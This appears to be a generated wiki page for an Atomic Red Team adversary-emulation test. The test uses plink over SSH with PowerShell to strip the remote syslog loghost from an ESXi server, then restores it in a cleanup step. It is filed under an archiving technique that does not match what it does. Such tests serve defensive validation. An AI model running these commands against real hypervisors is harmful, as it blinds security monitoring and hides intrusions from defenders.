---
atomic_guid: "36c62584-d360-41d6-886f-d194654be7c2"
title: "ESXi - Remove Syslog remote IP"
framework: "atomic"
generated: "true"
attack_technique_id: "T1560.001"
attack_technique_name: "Archive Collected Data: Archive via Utility"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "36c62584-d360-41d6-886f-d194654be7c2"
  - "ESXi - Remove Syslog remote IP"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# ESXi - Remove Syslog remote IP

An adversary may edit the syslog config to remove the loghost in order to prevent or redirect logs being received by SIEM.

## Metadata

- Atomic GUID: 36c62584-d360-41d6-886f-d194654be7c2
- Technique: T1560.001: Archive Collected Data: Archive via Utility
- Platforms: windows
- Executor: powershell
- Elevation Required: True
- Dependency Executor: powershell
- Source Path: atomics/T1560.001/T1560.001.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1560-archive_collected_data|T1560.001]]

## Input Arguments

### password

- description: password used to log into ESXI
- type: string
- default: n/a

### plink_file

- description: Path to Putty
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\plink.exe

### username

- description: Username used to log into ESXi
- type: string
- default: root

### vm_host

- description: Specify the host name of the ESXi Server
- type: string
- default: atomic.local

## Dependencies

The plink executable must be found in the ExternalPayloads folder.

### Prerequisite Check

```text
if (Test-Path "#{plink_file}") {exit 0} else {exit 1}
```

### Get Prerequisite

```text
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://the.earth.li/~sgtatham/putty/latest/w64/plink.exe" -OutFile "#{plink_file}"
```

## Executor

- elevation_required: True
- name: powershell

### Command

```powershell
# Extract line with IP address from the syslog configuration output
#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_get_loghost.txt | findstr /r "[0-9]*\.[0-9]*\.[0-9]*\." > c:\temp\loghost.txt

# Replace the IP with "0"
#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m PathToAtomicsFolder\..\atomics\T1560.001\src\esxi_remove_loghost.txt

# Extract the IP from the line extracted from findstr
$inputFilePath = "c:\temp\loghost.txt"
$outputFilePath = "c:\temp\loghost_ip.txt"

$fileContent = Get-Content -Path $inputFilePath -Raw

if ([string]::IsNullOrWhiteSpace($fileContent)) {
    Write-Host "The content is $fileContent"
    Write-Host "The file is empty"
} else {
    # Use a regular expression to extract IP addresses
    $ipAddresses = [regex]::Matches($fileContent, '(udp|tcp):\/\/[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.*').Value
    
    $output = "esxcli system syslog config set --loghost=" + $ipAddresses

    $output | Out-File -FilePath $outputFilePath -Encoding ascii
    
    Write-Host "IP addresses extracted and saved to $outputFilePath"
}
```

### Cleanup

```powershell
# Re-add the initially extracted IP
#{plink_file} -ssh #{vm_host} -l #{username} -pw #{password} -m c:\temp\loghost_ip.txt

rm c:\temp\loghost_ip.txt
rm c:\temp\loghost.txt
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1560.001/T1560.001.yaml)
